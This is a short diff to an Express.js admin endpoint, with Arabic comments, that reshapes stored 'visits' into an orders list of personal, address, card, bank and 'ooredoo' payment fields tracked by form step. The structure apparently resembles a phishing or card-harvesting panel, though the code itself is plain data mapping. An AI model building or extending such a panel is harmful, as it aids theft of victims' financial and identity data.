@@ -68,14 +68,42 @@ app.get('/api/admin/orders', (req, res) => {
   }
 
   // تحويل visits إلى orders format
-  const ordersList = Object.values(visits).map(v => ({
-    ref: v.visitId,
-    ts: v.createdAt || Date.now(),
-    status: v.status || 'active',
-    ...v // دمج جميع البيانات الأخرى
-  }));
+  const ordersList = Object.values(visits).map(v => {
+    // معالجة البيانات حسب النموذج المتوقع
+    return {
+      ref: v.visitId,           // معرّف الطلب
+      ts: v.createdAt || v.updatedAt || Date.now(),  // الوقت
+      status: v.status || 'active',  // الحالة
+      // معلومات شخصية
+      n: v.name || v.n || 'بدون اسم',
+      p: v.phone || v.p || '',
+      e: v.email || v.e || '',
+      g: v.gender || v.g || '',
+      id: v.id || '',
+      // البيانات الجغرافية
+      em: v.emirate || v.em || '',
+      a: v.area || v.a || '',
+      ad: v.address || v.ad || '',
+      st: v.status_type || v.st || '',
+      // البيانات المتعلقة بالطلب
+      card: v.card || '',
+      cardName: v.cardName || '',
+      watch: v.watch || '',
+      watchName: v.watchName || '',
+      bank: v.bank || '',
+      bankName: v.bankName || '',
+      step: v.step || 'form',
+      // بيانات الدفع
+      pay: v.pay || null,
+      ooredoo: v.ooredoo || null,
+      // معلومات أخرى
+      page: v.page || '',
+      lang: v.lang || 'ar',
+      ...v // دمج أي بيانات إضافية
+    };
+  });
 
-  const active = ordersList.filter(o => o.status === 'active').length;
+  const active = ordersList.filter(o => o.status === 'active' || o.status === 'awaiting').length;
   res.json({
     orders: ordersList,
     active: active
